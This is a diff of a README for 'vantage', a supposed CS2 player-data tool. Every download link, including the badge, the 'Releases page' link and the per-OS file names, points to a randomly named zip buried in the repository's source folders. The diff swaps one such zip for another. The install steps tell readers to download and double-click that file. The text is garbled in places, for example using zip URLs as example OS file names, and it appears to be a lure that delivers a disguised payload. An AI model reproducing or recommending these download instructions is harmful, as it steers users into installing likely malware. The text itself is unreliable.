@@ -1,10 +1,10 @@
 # 🎮 vantage - Your CS2 Data Companion
 
 ## 🚀 Getting Started
-Welcome to **vantage**, your go-to tool for real-time intelligence in CS2. This platform gathers data from Steam, Faceit, and Leetify to help you understand risk scores through the proprietary "Trust Variance" system. With a user-friendly dashboard built on https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip and a robust backend supported by Fastify, you will have all the information you need at your fingertips.
+Welcome to **vantage**, your go-to tool for real-time intelligence in CS2. This platform gathers data from Steam, Faceit, and Leetify to help you understand risk scores through the proprietary "Trust Variance" system. With a user-friendly dashboard built on https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip and a robust backend supported by Fastify, you will have all the information you need at your fingertips.
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip%20Latest%https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip)](https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip)
+[![Download Latest Release](https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip%20Latest%https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip)](https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip)
 
 ## 🌟 Key Features
 - **Real-time Data Aggregation:** Seamlessly collects and analyzes data.
@@ -22,22 +22,22 @@ To run **vantage**, make sure you have the following:
 - Internet Connection: Required to access data from external APIs
 
 ## 📚 Download & Install
-To get started, you will need to visit the [Releases page](https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip) to download the application. Once you are there, follow these steps:
+To get started, you will need to visit the [Releases page](https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip) to download the application. Once you are there, follow these steps:
 
 1. Click on the latest version available at the top of the page.
 2. Look for assets below the release notes.
-3. Choose the file compatible with your operating system (for example, `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip`, `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip`, etc.).
+3. Choose the file compatible with your operating system (for example, `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip`, `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip`, etc.).
 4. Click the file to start the download.
 
 When the download is complete, simply follow these steps to install:
 
 ### Windows
-1. Double-click the downloaded `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip` file.
+1. Double-click the downloaded `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip` file.
 2. Follow the on-screen instructions to complete the installation.
 3. After the installation, find the Vantage application in your Start Menu or desktop and open it.
 
 ### macOS
-1. Open the downloaded `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/api/Software-cissoid.zip` file.
+1. Open the downloaded `https://github.com/Picolini25/vantage/raw/refs/heads/main/apps/web/src/pages/Software-spinsterlike.zip` file.
 2. Drag the **vantage** application to your Applications folder.
 3. Open your Applications folder and double-click on **vantage** to run it.
 
